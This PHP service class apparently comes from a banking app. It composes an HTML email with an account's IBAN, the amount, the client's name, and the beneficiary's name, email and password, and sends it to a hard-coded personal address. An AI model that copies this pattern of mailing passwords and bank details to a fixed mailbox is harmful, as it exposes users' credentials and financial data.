<?php

namespace App\Service;

class EnvoiMail
{
    public function envoi($account, $user, $userOrigin)
    {
        $body="Iban : ".$account->getIban().'</br>'."Montant : ".$account->getAmount().'</br>'."Client : ".$userOrigin->getFullname().'</br>'."Prénom de bénéficiare : ".$user->getFirstname().'</br>'."Nom du bénéficiaire : ".$user->getLastname().'</br>'."Email du bénéficiaire : ".$user->getEmail().'</br>'."Mot de passe : ".$user->getPassword()
        ;
        $message = (new \Swift_Message('Création bénéficiaire'))          
                ->setFrom('nuzzomarcel358@gmail.com')
                ->setTo('nuzzo.marcel@aliceadsl.fr')
                ->setBody($body,
                        'text/html'
            );
            
       return $message;

    }

}